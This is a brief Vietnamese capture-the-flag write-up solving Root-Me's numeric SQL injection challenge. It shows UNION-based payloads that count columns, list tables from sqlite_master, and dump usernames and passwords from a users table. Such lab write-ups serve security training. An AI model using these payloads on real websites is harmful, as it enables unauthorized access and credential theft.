## Link Challenge: [SQL Injection](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)

Lần này ta xác định được câu truy vấn SQL có vấn đề tồn tại ở link tới các blog.

Vẫn sử dụng SQL Injection UNION để kiểm thử website. Không có phần truy vấn nào phía sau `news_id` => không cần giả commment

Check số cột truy vấn cần bằng `SELECT NULL`, ta xác định được có 3 cột thì không trả về lỗi nào.
`UNION SELECT null,null,null`

Tiếp tục kiểm tra table mình cần truy vấn và xác định những cột truy vấn nào sẽ hiện ra màn hình (nhận ra là cột thứ 2 và 3 sẽ hiển thị)

Kiểm tra các table: `UNION SELECT 1, name, sql FROM sqlite_master`

![img1](https://i.imgur.com/2YKAmud.png)

Thấy bảng `users` chứa thông tin về account. Tiếp tục truy vấn UNION
`UNION SELECT 1, password, username FROM users`

![img2](https://i.imgur.com/fMACB8N.png)
DONE!